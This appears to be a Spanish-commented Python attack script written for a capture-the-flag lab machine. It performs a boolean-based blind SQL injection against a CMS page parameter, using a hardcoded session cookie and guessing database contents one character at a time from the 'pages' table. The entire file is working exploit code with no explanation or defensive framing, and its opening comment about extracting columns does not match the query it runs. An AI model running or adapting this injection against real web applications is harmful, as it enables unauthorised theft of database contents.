#!/usr/bin/python3

# Script para extraer las columnas de una tabla de una base de datos específica.

from pwn import *
import requests, signal, sys, time, string


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

#---------------------------------------------#

# Variables Globales
main_url = "http://192.168.0.76/imfadministrator/cms.php?pagename="
characters = string.ascii_lowercase + "&_-:,'" + string.digits

#---------------------------------------------#


def sqli_boolean():
    

     headers = {
        'Cookie': 'PHPSESSID=5u632liqcdohkrdkqs0kqb4h01'
     }
     
     data = ""

     p1 = log.progress("SQLI boolean")
     p1.status("Iniciando ataque de Inyección SQL")

     time.sleep(2)

     p2 = log.progress("Data")


     for position in range(1, 500):
         for character in characters:

             sqli_url = main_url + "home' or SUBSTRING((select group_concat(pagename) from pages),%d,1)='%s" % (position, character)

             r = requests.get(sqli_url, headers=headers)

             if "Welcome to the IMF Administration." not in r.text:
                 data += character
                 p2.status(data)
                 break

     p1.success("Ataque de Inyección SQL completado")
     p2.success(data)

#---------------------------------------------#

if __name__ == '__main__':
    sqli_boolean()
